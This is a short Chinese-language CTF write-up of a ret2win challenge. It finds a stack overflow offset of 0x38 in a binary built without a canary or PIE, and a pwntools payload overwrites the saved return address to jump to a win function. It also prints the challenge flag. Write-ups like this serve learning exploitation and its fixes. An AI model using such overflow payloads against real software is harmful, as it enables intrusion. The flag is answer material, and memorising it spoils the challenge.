# Wetuwn Addwess

## 题目简述

程序用不受限输入读取栈上名字，二进制无 Canary、无 PIE，且包含直接打印 flag 的 win 函数。覆盖保存的返回地址为 win 即可，是标准 ret2win。

## 解题过程

用 cyclic 输入确定从缓冲区起点到保存 RIP 的偏移为：

$$
0x30+8=0x38.
$$

无 PIE 使 win 地址固定，构造：

~~~python
from pwn import flat

payload = flat({
    0x38: exe.sym["win"],
})
io.sendlineafter(b"What's your name?", payload)
~~~

函数返回后 RIP 取到 win 地址，程序输出：

~~~text
maple{r3turn_t0_w1n}
~~~

若远程环境对栈对齐敏感，可在 win 前插入单独 ret gadget；本题官方链直接跳转即可。

## 方法总结

ret2win 的固定流程是检查保护、找危险读取点、用 cyclic 精确测偏移、定位目标函数并构造小端地址。不要凭源码数组长度猜 RIP 偏移，编译器对齐和保存的 RBP 都会改变实际布局。Canary 和 PIE 能提高利用成本，但首要修复仍是消除越界写。
